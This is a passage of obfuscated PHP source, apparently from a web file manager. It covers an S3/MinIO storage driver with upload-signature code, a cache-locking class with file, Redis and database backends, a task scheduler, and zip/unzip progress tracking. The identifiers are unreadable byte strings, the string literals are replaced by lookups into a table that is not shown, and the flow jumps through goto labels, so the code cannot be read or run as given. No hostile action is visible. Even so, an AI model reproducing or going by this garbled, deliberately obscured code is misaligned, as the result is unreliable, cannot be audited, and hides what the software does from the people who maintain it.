uploadFormData($¡”ğÆä, $±é´Èã = 3600) { $‡°çèÕ¡ =& $_SERVER[­á Ş³Ö]; $ğÓåÀÂá = $this->pathFather($¡”ğÆä); $ëÈµ‹İÓ = $this->client->getHttpUploadPostParams($this->bucket, $ğÓåÀÂá, $‡°çèÕ¡[199], $±é´Èã); return array_merge((array) $ëÈµ‹İÓ, array($‡°çèÕ¡[182] => $this->getHost())); } public function multiUploadFormData($ª¬®ûÕ, $¿¨ùõ§Ò = 3600) { $¼©Ÿ˜ø =& $_SERVER[­á Ş³Ö]; $Öİ‡†›‹ = gmdate($¼©Ÿ˜ø[222]); $â²ğß = array(); $Æ„é¾­ù = $this->client->getUploadId($this->bucket, $ª¬®ûÕ, $â²ğß); if (!$Æ„é¾­ù) { return !1; } return array($¼©Ÿ˜ø[223] => $Æ„é¾­ù, $¼©Ÿ˜ø[182] => $this->getHost() . $¼©Ÿ˜ø[8] . $this->pathEncode($ª¬®ûÕ), $¼©Ÿ˜ø[224] => $Öİ‡†›‹, $¼©Ÿ˜ø[94] => $ª¬®ûÕ); } public function multiUploadAuthData($Ó¤„œÆÓ, $ï™¢Â€Ï = array()) { $¯Ì±³³¢ =& $_SERVER[­á Ş³Ö]; $çªÖƒõ„ = isset($ï™¢Â€Ï[$¯Ì±³³¢[224]]) ? $ï™¢Â€Ï[$¯Ì±³³¢[224]] : gmdate($¯Ì±³³¢[222]); $³ˆ¾À‡ = isset($ï™¢Â€Ï[$¯Ì±³³¢[174]]) ? $ï™¢Â€Ï[$¯Ì±³³¢[174]] : $¯Ì±³³¢[12]; $ç©´ªÔš = $ï™¢Â€Ï[$¯Ì±³³¢[94]]; unset($ï™¢Â€Ï[$¯Ì±³³¢[94]]); if (isset($ï™¢Â€Ï[$¯Ì±³³¢[225]])) { $ï™¢Â€Ï[$¯Ì±³³¢[224]] = $çªÖƒõ„; return $this->listUploadParts($ç©´ªÔš, $ï™¢Â€Ï); } $®í„´Ìœ = array($¯Ì±³³¢[226], $¯Ì±³³¢[12], $¯Ì±³³¢[120], $¯Ì±³³¢[12], "\170\55\141\x6d\x7a\x2d\144\141\164\x65\72{$çªÖƒõ„}", $¯Ì±³³¢[8] . $this->bucket . $¯Ì±³³¢[8] . $this->pathEncode($ç©´ªÔš) . $³ˆ¾À‡); if (strpos($³ˆ¾À‡, $¯Ì±³³¢[227]) === 0) { $®í„´Ìœ[0] = $¯Ì±³³¢[228]; } if (isset($ï™¢Â€Ï[$¯Ì±³³¢[229]]) && $ï™¢Â€Ï[$¯Ì±³³¢[229]] == $¯Ì±³³¢[230]) { $®í„´Ìœ[0] = $¯Ì±³³¢[230]; } $ÛÌÔ…İä = implode($¯Ì±³³¢[231], $®í„´Ìœ); $ÏÃ«¹¤õ = base64_encode(hash_hmac($¯Ì±³³¢[232], $ÛÌÔ…İä, $this->secret, !0)); $²‡³âò® = $¯Ì±³³¢[233] . $this->accessKey . $¯Ì±³³¢[4] . $ÏÃ«¹¤õ; if (strpos($³ˆ¾À‡, $¯Ì±³³¢[227]) === 0) { return array($¯Ì±³³¢[234] => $²‡³âò®, $¯Ì±³³¢[224] => $çªÖƒõ„); } return $²‡³âò®; } public function listUploadParts($ûñóíÜÀ, $ç™»é = array()) { $Ä¸»ñî’ =& $_SERVER[­á Ş³Ö]; $“­œöÓ = str_replace($Ä¸»ñî’[235], $Ä¸»ñî’[12], $ç™»é[$Ä¸»ñî’[174]]); $êÃºíè· = $this->client->listParts($this->bucket, $ûñóíÜÀ, $“­œöÓ); if (!$êÃºíè·) { return !1; } unset($ç™»é[$Ä¸»ñî’[225]], $ç™»é[$Ä¸»ñî’[229]]); $ç™»é[$Ä¸»ñî’[94]] = $ûñóíÜÀ; $¶ªÕ¸Ô• = $this->multiUploadAuthData($ûñóíÜÀ, $ç™»é); if (empty($¶ªÕ¸Ô•)) { return !1; } return array($Ä¸»ñî’[234] => $¶ªÕ¸Ô•, $Ä¸»ñî’[224] => $ç™»é[$Ä¸»ñî’[224]], $Ä¸»ñî’[236] => $êÃºíè·); } public function getHost() { return parent::getHost() . $_SERVER[­á Ş³Ö][8] . $this->bucket; } public function size($øá‚Š¨¶) { $£¦â‰™ˆ = $this->objectMeta($øá‚Š¨¶); return $£¦â‰™ˆ ? $£¦â‰™ˆ[$_SERVER[­á Ş³Ö][76]] : 0; } public function info($¶şˆ€û£) { if ($this->isFolder($¶şˆ€û£)) { return $this->folderInfo($¶şˆ€û£); } else { if ($this->isFile($¶şˆ€û£)) { return $this->fileInfo($¶şˆ€û£); } } return !1; } public function exist($•èóªÎŞ) { return $this->isFile($•èóªÎŞ) || $this->isFolder($•èóªÎŞ); } public function isFile($ú÷ ÎÜ) { return !$this->isFolder($ú÷ ÎÜ) && $this->objectMeta($ú÷ ÎÜ); } public function isFolder($©®³Ë§) { return $this->cacheMethod($_SERVER[­á Ş³Ö][165], $©®³Ë§); } protected function objectMeta($¶…Â‰³ß) { return $this->cacheMethod($_SERVER[­á Ş³Ö][167], $¶…Â‰³ß); } protected function _objectMeta($‰õ˜ğòº) { $¹õ™Ó¨ =& $_SERVER[­á Ş³Ö]; $‰õ˜ğòº = rtrim($‰õ˜ğòº, $¹õ™Ó¨[8]); try { $€¿¡€Ó› = $this->client->getObjectInfo($this->bucket, $‰õ˜ğòº); if (!isset($€¿¡€Ó›[$¹õ™Ó¨[221]]) && isset($€¿¡€Ó›[$¹õ™Ó¨[237]])) { $€¿¡€Ó›[$¹õ™Ó¨[221]] = $€¿¡€Ó›[$¹õ™Ó¨[237]]; } } catch (Exception $±µ»ö¶…) { $€¿¡€Ó› = !1; } if (!$€¿¡€Ó›) { } return $€¿¡€Ó›; } protected function _isFolder($ñ›¸–¼—) { $ş…óÑÀí =& $_SERVER[­á Ş³Ö]; $ñ›¸–¼— = rtrim($ñ›¸–¼—, $ş…óÑÀí[8]); if ($ñ›¸–¼— == $ş…óÑÀí[12] || $ñ›¸–¼— == $ş…óÑÀí[8]) { return !0; } $óû£Öİô = $this->client->getBucket($this->bucket, $ñ›¸–¼—, null, 1); if (empty($óû£Öİô[$ş…óÑÀí[204]])) { return !1; } $¹µ‚»¦’ = $óû£Öİô[$ş…óÑÀí[204]][0][$ş…óÑÀí[32]]; return stripos($¹µ‚»¦’, $ñ›¸–¼— . $ş…óÑÀí[8]) === 0 ? !0 : !1; if (substr($¹µ‚»¦’, -1) == $ş…óÑÀí[8]) { return !0; } if (get_path_this($¹µ‚»¦’) == get_path_this($ñ›¸–¼—)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($–é«ÒŒ) { parent::__construct($–é«ÒŒ); $this->signatureVersion($_SERVER[­á Ş³Ö][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto F³²é“èù–; c•÷¡öˆùõ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ôÁª„Øé =& $_SERVER[­á Ş³Ö]; if (self::$handle) { return self::$handle; } $²œ²ÜÅ… = $GLOBALS[$ôÁª„Øé[6]][$ôÁª„Øé[349]]; self::$timeout = $²œ²ÜÅ…[$ôÁª„Øé[837]] ? $²œ²ÜÅ…[$ôÁª„Øé[837]] : 10; $ÀœóÈ = _get($GLOBALS[$ôÁª„Øé[6]], $ôÁª„Øé[838]); $ëõ¡©¤Ó = $²œ²ÜÅ…[$ôÁª„Øé[824]] ? $²œ²ÜÅ…[$ôÁª„Øé[824]] : $ôÁª„Øé[200]; if ($ëõ¡©¤Ó == $ôÁª„Øé[21] && $ÀœóÈ == $ôÁª„Øé[13]) { $ëõ¡©¤Ó = $ôÁª„Øé[200]; } switch ($ëõ¡©¤Ó) { case $ôÁª„Øé[827]: self::$handle = new CacheLockRedis(); break; case $ôÁª„Øé[828]: self::$handle = new CacheLockMemcached(); break; case $ôÁª„Øé[21]: self::$handle = new CacheLockDatabase(); break; case $ôÁª„Øé[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ôÁª„Øé[839], $ôÁª„Øé[840]); } return self::$handle; } private static function key($ÀÃÖ‰¤¿) { return $_SERVER[­á Ş³Ö][841] . Cache::key($ÀÃÖ‰¤¿); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÑùÎæ˜¸ = '') { self::$errorMsg = $ÑùÎæ˜¸; } public static function lockGlobal($ƒúÉó»ù, $Š¾‘¿”î) { return self::lock($ƒúÉó»ù, $Š¾‘¿”î, !0); } public static function lock($«ÏœĞà÷, $ÚÎßğÍ† = false, $ŸÚµ€³Ë = false) { $»Ññº‹Š =& $_SERVER[­á Ş³Ö]; $ñş•¨È€ = self::init(); $»ÇÈ‰°¥ = self::key($«ÏœĞà÷); $ÚÎßğÍ† = $ÚÎßğÍ† ? $ÚÎßğÍ† : self::$timeout; $Ø—‘–ƒ‘ = timeFloat(); $õäÈÑş© = $ñş•¨È€->lock($»ÇÈ‰°¥, $ÚÎßğÍ†); $ŒÛ¹¢›À = timeFloat(); if (!$õäÈÑş©) { $‚È‹­ê½ = "\154\157\143\153\x20\x65\162\162\x6f\162\x3b\153\x65\171\75{$«ÏœĞà÷}\x3b\164\x69\155\145\x3d{$ÚÎßğÍ†}\73" . self::$errorMsg . $»Ññº‹Š[71] . get_caller_msg(); $ãñ¯†»– = LNG($»Ññº‹Š[842]) . "\x28{$ÚÎßğÍ†}\x73\51\56" . LNG($»Ññº‹Š[843]); $ãñ¯†»– .= $»Ññº‹Š[844]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ãñ¯†»– = $ãñ¯†»– . $»Ññº‹Š[845] . self::$errorMsg; } write_log($»Ññº‹Š[846] . sprintf($»Ññº‹Š[847], timeFloat() - $Ø—‘–ƒ‘) . $»Ññº‹Š[848] . $‚È‹­ê½ . $»Ññº‹Š[849] . error_get_last(), $»Ññº‹Š[840]); show_json($ãñ¯†»–, !1); } if (!$ŸÚµ€³Ë) { self::$lockItem[$»ÇÈ‰°¥] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ìº¼™Ğ = number_format(timeFloat() - $ŒÛ¹¢›À, 3); write_log($»Ññº‹Š[850] . $«ÏœĞà÷ . $»Ññº‹Š[851] . $ìº¼™Ğ, $»Ññº‹Š[840]); } return $õäÈÑş©; } public static function lockGet($Ã¸Óƒ») { $ú—·¹Í = self::key($Ã¸Óƒ»); if (self::$lockItem[$ú—·¹Í]) { return self::$lockItem[$ú—·¹Í]; } return self::init()->lockGet($ú—·¹Í); } public static function unlock($§îıÚÑº) { $²ñÂìÀ± =& $_SERVER[­á Ş³Ö]; $·£ó– = self::key($§îıÚÑº); self::$lockItem[$·£ó–] = null; self::init()->unlock($·£ó–); if (GLOBAL_DEBUG_LOG_ALL) { write_log($²ñÂìÀ±[852] . $§îıÚÑº, $²ñÂìÀ±[840]); } return; } public static function unlockRuntime() { $±ğ—ù÷¨ =& $_SERVER[­á Ş³Ö]; $ë×Õå¨‡ = self::init(); $êµ²‚Ç’ = !1; foreach (self::$lockItem as $Ã‡ÕÑˆ‡ => $¦÷²‡©“) { if (!$¦÷²‡©“) { continue; } $ë×Õå¨‡->unlock($Ã‡ÕÑˆ‡); if (!$êµ²‚Ç’) { $êµ²‚Ç’ = !0; write_log($±ğ—ù÷¨[853] . $Ã‡ÕÑˆ‡ . $±ğ—ù÷¨[71] . get_caller_msg(), $±ğ—ù÷¨[840]); continue; } write_log($±ğ—ù÷¨[853] . $Ã‡ÕÑˆ‡, $±ğ—ù÷¨[840]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ú¯Âòê = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±ğ—ù÷¨[854] . $Ú¯Âòê . $±ğ—ù÷¨[855] . ACTION, $±ğ—ù÷¨[840]); } } public static function fileLock($³ßÏ«£) { $‹‰ÙÛÒÒ =& $_SERVER[­á Ş³Ö]; if (!$GLOBALS[$‹‰ÙÛÒÒ[856]]) { $GLOBALS[$‹‰ÙÛÒÒ[856]] = array(); } $GLOBALS[$‹‰ÙÛÒÒ[856]][$³ßÏ«£] = !1; $¢ œ« = fopen(DATA_PATH . $³ßÏ«£ . $‹‰ÙÛÒÒ[857], $‹‰ÙÛÒÒ[858]); if (!$¢ œ«) { return !1; } $GLOBALS[$‹‰ÙÛÒÒ[856]][$³ßÏ«£] = $¢ œ«; if (flock($¢ œ«, LOCK_EX)) { return !0; } self::unlock($³ßÏ«£); show_json($‹‰ÙÛÒÒ[859], !1); return !1; } public static function fileUnlock($¨Âµ²½) { $ííı¥ÜÛ =& $_SERVER[­á Ş³Ö]; $”êÖš¥æ = $GLOBALS[$ííı¥ÜÛ[856]][$¨Âµ²½]; if (!$”êÖš¥æ) { return; } $GLOBALS[$ííı¥ÜÛ[856]][$¨Âµ²½] = !1; flock($”êÖš¥æ, LOCK_UN); fclose($”êÖš¥æ); } public static function fileUnlockAll() { $º¥•„¶ =& $_SERVER[­á Ş³Ö]; if (!$GLOBALS[$º¥•„¶[856]]) { return; } foreach ($GLOBALS[$º¥•„¶[856]] as $ƒ•òÓ¦î => $ÎğË¨ˆß) { if (!$ÎğË¨ˆß) { continue; } $GLOBALS[$º¥•„¶[856]][$ƒ•òÓ¦î] = !1; flock($ÎğË¨ˆß, LOCK_UN); fclose($ÎğË¨ˆß); } $GLOBALS[$º¥•„¶[856]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¹Ï…†‹© =& $_SERVER[­á Ş³Ö]; $Ê²£Ãàµ = $GLOBALS[$¹Ï…†‹©[6]][$¹Ï…†‹©[349]]; self::$cachePath = $Ê²£Ãàµ[$¹Ï…†‹©[200]][$¹Ï…†‹©[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¹Şß®í, $—×à§Ë = 0) { $Ê“ª„¿Œ =& $_SERVER[­á Ş³Ö]; $Ï’Ú³„ = microtime(!0); $¬üÌŞ°Ô = $Ï’Ú³„ + $—×à§Ë + 0.0001; $ÏËÃ şë = rtrim(self::$cachePath, $Ê“ª„¿Œ[8]) . $Ê“ª„¿Œ[860] . md5($¹Şß®í) . $Ê“ª„¿Œ[857]; if (file_exists($ÏËÃ şë) && filemtime($ÏËÃ şë) && filemtime($ÏËÃ şë) < time() - 10) { @unlink($ÏËÃ şë); } do { if (file_exists($ÏËÃ şë)) { cacheLockWait(); continue; } $©”îÂÀè = fopen($ÏËÃ şë, $Ê“ª„¿Œ[861]); if (!$©”îÂÀè) { return !1; } $½ˆÙµ = flock($©”îÂÀè, LOCK_EX | LOCK_NB); self::$caches[$¹Şß®í] = array($Ê“ª„¿Œ[862] => $©”îÂÀè, $Ê“ª„¿Œ[200] => $ÏËÃ şë); fwrite($©”îÂÀè, $¬üÌŞ°Ô); clearstatcache(); if ($©”îÂÀè && $½ˆÙµ) { return !0; } cacheLockWait(); } while (microtime(!0) < $¬üÌŞ°Ô); $this->unlock($¹Şß®í); return !1; } public function lockGet($°ó’­¡«) { $¾Ï¥Š¦ =& $_SERVER[­á Ş³Ö]; $¿Œ‚š†Ÿ = rtrim(self::$cachePath, $¾Ï¥Š¦[8]) . $¾Ï¥Š¦[860] . md5($°ó’­¡«) . $¾Ï¥Š¦[857]; return file_exists($¿Œ‚š†Ÿ); } public function unlock($Ç·Ş¢Û) { $’ºöë¥ï =& $_SERVER[­á Ş³Ö]; $Ášà²ôŞ = self::$caches[$Ç·Ş¢Û]; if (!$Ášà²ôŞ) { return; } @flock($Ášà²ôŞ[$’ºöë¥ï[862]], LOCK_UN); @fclose($Ášà²ôŞ[$’ºöë¥ï[862]]); @unlink($Ášà²ôŞ[$’ºöë¥ï[200]]); unset(self::$caches[$Ç·Ş¢Û]); } } goto B«Ô†Çç›·; FŸ …¬•Ì‘: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ìç¢ôåğ, $®ˆ¿¨Óå = 5.0) { if (!$ìç¢ôåğ) { return; } $óµºã… = Cache::get($ìç¢ôåğ); if (!$óµºã… || timeFloat() - floatVal($óµºã…) >= $®ˆ¿¨Óå) { Cache::set($ìç¢ôåğ, timeFloat(), $®ˆ¿¨Óå * 10); return !0; } return !1; } public static function timeLimitCall($²ÃËÔ¬Õ, $‹½”˜ÅÄ, $¢·Ü‚Ëí, $ÛŸ®ˆú  = 5.0) { $÷…µ›™¹ =& $_SERVER[­á Ş³Ö]; if (!$²ÃËÔ¬Õ || !$‹½”˜ÅÄ) { return; } self::$asyncAdd = !0; $„Š–œøû = $÷…µ›™¹[1766]; $óâëæ©ı = Cache::get($„Š–œøû, !0); $ğãËè± = array($÷…µ›™¹[1767] => timeFloat(), $÷…µ›™¹[1768] => timeFloat(), $÷…µ›™¹[264] => $‹½”˜ÅÄ, $÷…µ›™¹[1761] => $¢·Ü‚Ëí, $÷…µ›™¹[180] => $ÛŸ®ˆú ); if (is_array($óâëæ©ı[$²ÃËÔ¬Õ])) { $ğãËè±[$÷…µ›™¹[1768]] = $óâëæ©ı[$²ÃËÔ¬Õ][$÷…µ›™¹[1768]]; } if (is_array($óâëæ©ı[$²ÃËÔ¬Õ])) { if (timeFloat() - $óâëæ©ı[$²ÃËÔ¬Õ][$÷…µ›™¹[1767]] < $ğãËè±[$÷…µ›™¹[180]] * 0.3) { return; } $ğãËè±[$÷…µ›™¹[1768]] = $óâëæ©ı[$²ÃËÔ¬Õ][$÷…µ›™¹[1768]]; } $óâëæ©ı[$²ÃËÔ¬Õ] = $ğãËè±; Cache::set($„Š–œøû, $óâëæ©ı, 60); Cache::removeMemory($„Š–œøû); write_log($÷…µ›™¹[1769] . $²ÃËÔ¬Õ . $÷…µ›™¹[71] . $‹½”˜ÅÄ, $÷…µ›™¹[1763]); } public static function timeLimitCallLoop() { $Á¯ÀĞ· =& $_SERVER[­á Ş³Ö]; $æ³Ş¢°Œ = array($Á¯ÀĞ·[1770]); $ ãÂ—Õ¡ = in_array(strtolower(ACTION), $æ³Ş¢°Œ); if (!$ ãÂ—Õ¡ && !self::$asyncAdd) { return; } $‰—„Ù©÷ = $Á¯ÀĞ·[1766]; $Òƒ“ÑÄÏ = Cache::get($‰—„Ù©÷, !0); if (!$Òƒ“ÑÄÏ || count($Òƒ“ÑÄÏ) <= 0) { return; } $¦€™­¨ = !1; $•¢Ì“Ÿ¶ = timeFloat(); $åö£¬Æ = array(); foreach ($Òƒ“ÑÄÏ as $¥ÜÏß‚š => $ìã¹½’Â) { if ($•¢Ì“Ÿ¶ - $ìã¹½’Â[$Á¯ÀĞ·[1768]] > $ìã¹½’Â[$Á¯ÀĞ·[180]]) { $¦€™­¨ = !0; try { Hook::apply($ìã¹½’Â[$Á¯ÀĞ·[264]], $ìã¹½’Â[$Á¯ÀĞ·[1761]]); write_log($Á¯ÀĞ·[1771] . $¥ÜÏß‚š . $Á¯ÀĞ·[71] . $ìã¹½’Â[$Á¯ÀĞ·[264]] . $Á¯ÀĞ·[1772] . ACTION, $Á¯ÀĞ·[1763]); } catch (Exception $½Áô™‘Â) { } continue; } $åö£¬Æ[$¥ÜÏß‚š] = $ìã¹½’Â; } if (!$¦€™­¨) { return; } if (!$åö£¬Æ) { return Cache::remove($‰—„Ù©÷); } Cache::set($‰—„Ù©÷, $åö£¬Æ, 60); Cache::removeMemory($‰—„Ù©÷); } public static function finished($³ŞŒÍ–©, $Æ×ÍÏÆñ) { $öÎÏå¬“ =& $_SERVER[­á Ş³Ö]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($öÎÏå¬“[264] => $³ŞŒÍ–©, $öÎÏå¬“[1761] => $Æ×ÍÏÆñ); } private static function finishedRun() { $˜Àçöãñ =& $_SERVER[­á Ş³Ö]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $—éÌ²ÀÈ) { try { Hook::apply($—éÌ²ÀÈ[$˜Àçöãñ[264]], $—éÌ²ÀÈ[$˜Àçöãñ[1761]]); } catch (Exception $¥š•ş–‹) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÑÂ‹ß¹Ù =& $_SERVER[­á Ş³Ö]; parent::startAfter(); Hook::bind($ÑÂ‹ß¹Ù[1773], array($this, $ÑÂ‹ß¹Ù[1774])); Hook::bind($ÑÂ‹ß¹Ù[1189], array($this, $ÑÂ‹ß¹Ù[1775])); $×‰Ş¦Àâ =& $this->task; $×‰Ş¦Àâ[$ÑÂ‹ß¹Ù[1776]] = $ÑÂ‹ß¹Ù[1190]; if (!$×‰Ş¦Àâ[$ÑÂ‹ß¹Ù[1561]]) { $×‰Ş¦Àâ[$ÑÂ‹ß¹Ù[1561]] = LNG($ÑÂ‹ß¹Ù[1777]); } } protected function endAfter() { $—ğØ Ï =& $_SERVER[­á Ş³Ö]; parent::endAfter(); Hook::unbind($—ğØ Ï[1773], array($this, $—ğØ Ï[1774])); Hook::unbind($—ğØ Ï[1189], array($this, $—ğØ Ï[1775])); } public function updateAfter() { $—Ø€‹÷œ =& $_SERVER[­á Ş³Ö]; $ÅŠØ©·Ê =& $this->task; if (!$ÅŠØ©·Ê[$—Ø€‹÷œ[783]] || !$ÅŠØ©·Ê[$—Ø€‹÷œ[760]]) { return; } if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1776]] == $—Ø€‹÷œ[1190]) { $ÂìÁ­ıó = 0; if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1716]]) { $ÂìÁ­ıó = $ÅŠØ©·Ê[$—Ø€‹÷œ[1717]] / $ÅŠØ©·Ê[$—Ø€‹÷œ[1716]]; } $ÅŠØ©·Ê[$—Ø€‹÷œ[1665]] = $ÂìÁ­ıó * 0.3; } else { if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1776]] == $—Ø€‹÷œ[313]) { $ÂìÁ­ıó = $ÅŠØ©·Ê[$—Ø€‹÷œ[1664]] / $ÅŠØ©·Ê[$—Ø€‹÷œ[783]]; $ÅŠØ©·Ê[$—Ø€‹÷œ[1665]] = 0.3 + $ÂìÁ­ıó * 0.4; } else { if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1776]] == $—Ø€‹÷œ[107]) { $ñë·£ÀÌ = 0; if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1718]] == $—Ø€‹÷œ[107]) { $ñë·£ÀÌ = $ÅŠØ©·Ê[$—Ø€‹÷œ[1717]]; } $ÂìÁ­ıó = ($ÅŠØ©·Ê[$—Ø€‹÷œ[1721]] + $ñë·£ÀÌ) / $ÅŠØ©·Ê[$—Ø€‹÷œ[760]]; $ÅŠØ©·Ê[$—Ø€‹÷œ[1665]] = 0.3 + 0.4 + $ÂìÁ­ıó * 0.3; } } } if ($ÅŠØ©·Ê[$—Ø€‹÷œ[1665]] > 0) { $„—•ò’ = timeFloat() - $ÅŠØ©·Ê[$—Ø€‹÷œ[1667]] - $ÅŠØ©·Ê[$—Ø€‹÷œ[1670]]; $ÅŠØ©·Ê[$—Ø€‹÷œ[1671]] = $„—•ò’ * (1 - $ÅŠØ©·Ê[$—Ø€‹÷œ[1665]]) / $ÅŠØ©·Ê[$—Ø€‹÷œ[1665]]; } } public function addFile($ßƒ¥®İŞ) { $éÒ×õ½ =& $_SERVER[­á Ş³Ö]; $ïèË„¡ƒ =& $this->task; $´‹« = IO::info($ßƒ¥®İŞ); $ïèË„¡ƒ[$éÒ×õ½[1714]] = $´‹«[$éÒ×õ½[32]]; $ïèË„¡ƒ[$éÒ×õ½[1716]] = $´‹«[$éÒ×õ½[76]]; $ïèË„¡ƒ[$éÒ×õ½[1717]] = 0; $ïèË„¡ƒ[$éÒ×õ½[1060]] = $éÒ×õ½[1737]; $ïèË„¡ƒ[$éÒ×õ½[1718]] = $éÒ×õ½[1190]; $ïèË„¡ƒ[$éÒ×õ½[760]] = $´‹«[$éÒ×õ½[76]]; $ïèË„¡ƒ[$éÒ×õ½[783]] = 1; $ÏÁ¯·¦ = 0; $ïèË„¡ƒ[$éÒ×õ½[1725]] = array($éÒ×õ½[1726] => $ÏÁ¯·¦ + 1, $éÒ×õ½[420] => $´‹«[$éÒ×õ½[32]], $éÒ×õ½[84] => $´‹«[$éÒ×õ½[84]], $éÒ×õ½[509] => $´‹«[$éÒ×õ½[509]] ? $´‹«[$éÒ×õ½[509]] : $´‹«[$éÒ×õ½[84]]); $this->update(); } public function unzipAfter($ÆŸøµğ) { $ÛÎº¯¸» =& $_SERVER[­á Ş³Ö]; $Î“ÓÜ„… =& $this->task; $Î“ÓÜ„…[$ÛÎº¯¸»[1776]] = $ÛÎº¯¸»[107]; $…ÛÛâì = IO::infoWithChildren($ÆŸøµğ); $‘£úùú× = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[1725]] = array($ÛÎº¯¸»[1726] => $‘£úùú× + 1, $ÛÎº¯¸»[420] => $…ÛÛâì[$ÛÎº¯¸»[32]], $ÛÎº¯¸»[84] => $…ÛÛâì[$ÛÎº¯¸»[84]], $ÛÎº¯¸»[509] => $…ÛÛâì[$ÛÎº¯¸»[509]] ? $…ÛÛâì[$ÛÎº¯¸»[509]] : $…ÛÛâì[$ÛÎº¯¸»[84]]); if ($…ÛÛâì[$ÛÎº¯¸»[33]] == $ÛÎº¯¸»[200]) { $Î“ÓÜ„…[$ÛÎº¯¸»[783]] = 1; } else { $Î“ÓÜ„…[$ÛÎº¯¸»[783]] = $…ÛÛâì[$ÛÎº¯¸»[79]][$ÛÎº¯¸»[77]]; } $Î“ÓÜ„…[$ÛÎº¯¸»[1060]] = $ÛÎº¯¸»[12]; $Î“ÓÜ„…[$ÛÎº¯¸»[1718]] = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[1664]] = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[1716]] = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[1717]] = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[1714]] = $ÛÎº¯¸»[12]; $Î“ÓÜ„…[$ÛÎº¯¸»[1721]] = 0; $Î“ÓÜ„…[$ÛÎº¯¸»[760]] = $…ÛÛâì[$ÛÎº¯¸»[76]]; $this->update(); self::log($ÛÎº¯¸»[1778] . json_encode(array($Î“ÓÜ„…, $…ÛÛâì))); } public function nameParse($ïåÙóÁ–) { $¹Œ±˜î÷ =& $_SERVER[­á Ş³Ö]; $ßî°µ¢’ =& $this->task; if ($ßî°µ¢’[$¹Œ±˜î÷[1776]] == $¹Œ±˜î÷[1190]) { $ßî°µ¢’[$¹Œ±˜î÷[1776]] = $¹Œ±˜î÷[313]; $ßî°µ¢’[$¹Œ±˜î÷[1721]] = 0; $ßî°µ¢’[$¹Œ±˜î÷[760]] = 0; } $³‘ÎÙëÔ = get_path_this($ïåÙóÁ–); if (strstr($³‘ÎÙëÔ, $¹Œ±˜î÷[10])) { $ßî°µ¢’[$¹Œ±˜î÷[1664]] += 1; $ßî°µ¢’[$¹Œ±˜î÷[783]] += 1; } $ßî°µ¢’[$¹Œ±˜î÷[1714]] = $ïåÙóÁ–; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ô¡¨îòï =& $_SERVER[­á Ş³Ö]; parent::startAfter(); Hook::bind($ô¡¨îòï[1779], array($this, $ô¡¨îòï[1774])); $Ùâ”éà =& $this->task; $Ùâ”éà[$ô¡¨îòï[1776]] = $ô¡¨îòï[1190]; if (!$Ùâ”éà[$ô¡¨îòï[1561]]) { $Ùâ”éà[$ô¡¨îòï[1561]] = LNG($ô¡¨îòï[1780]); } } protected function endAfter() { $¨“«¤«‹ =& $_SERVER[­á Ş³Ö]; parent::endAfter(); Hook::unbind($¨“«¤«‹[1779], array($this, $¨“«¤«‹[1774])); } public function updateAfter() { $Ü¿ æ› =& $_SERVER[­á Ş³Ö]; $ËÙúëŒ• =& $this->task; if (!$ËÙúëŒ•[$Ü¿ æ›[783]] || !$ËÙúëŒ•[$Ü¿ æ›[760]]) { return; } if ($ËÙúëŒ•[$Ü¿ æ›[1776]] == $Ü¿ æ›[1190]) { $ĞãÀŒÅ = $ËÙúëŒ•[$Ü¿ æ›[1717]]; if ($ËÙúëŒ•[$Ü¿ æ›[1718]] != $Ü¿ æ›[1190]) { $ĞãÀŒÅ = 0; } $•ÕÅŞ«ƒ = ($ËÙúëŒ•[$Ü¿ æ›[1721]] + $ĞãÀŒÅ) / $ËÙúëŒ•[$Ü¿ æ›[760]]; $ËÙúëŒ•[$Ü¿ æ›[1665]] = $•ÕÅŞ«ƒ * 0.3; } else { if ($ËÙúëŒ•[$Ü¿ æ›[1776]] == $Ü¿ æ›[313]) { $•ÕÅŞ«ƒ = $ËÙúëŒ•[$Ü¿ æ›[1664]] / $ËÙúëŒ•[$Ü¿ æ›[783]]; $ËÙúëŒ•[$Ü¿ æ›[1665]] = 0.3 + $•ÕÅŞ«ƒ * 0.5; } else { if ($ËÙúëŒ•[$Ü¿ æ›[1776]] == $Ü¿ æ›[107]) { $•ÕÅŞ«ƒ = 0; if ($ËÙúëŒ•[$Ü¿ æ›[1716]]) { $•ÕÅŞ«ƒ = $ËÙúëŒ•[$Ü¿ æ›[1717]] / $ËÙúëŒ•[$Ü¿ æ›[1716]]; } $ËÙúëŒ•[$Ü¿ æ›[1665]] = 0.3 + 0.5 + $•ÕÅŞ«ƒ * 0.2; } } } if ($ËÙúëŒ•[$Ü¿ æ›[1665]] > 0) { $üƒã³ßã = timeFloat() - $ËÙúëŒ•[$Ü¿ æ›[1667]] - $ËÙúëŒ•[$Ü¿ æ›[1670]]; $ËÙúëŒ•[$Ü¿ æ›[1671]] = $üƒã³ßã * (1 - $ËÙúëŒ•[$Ü¿ 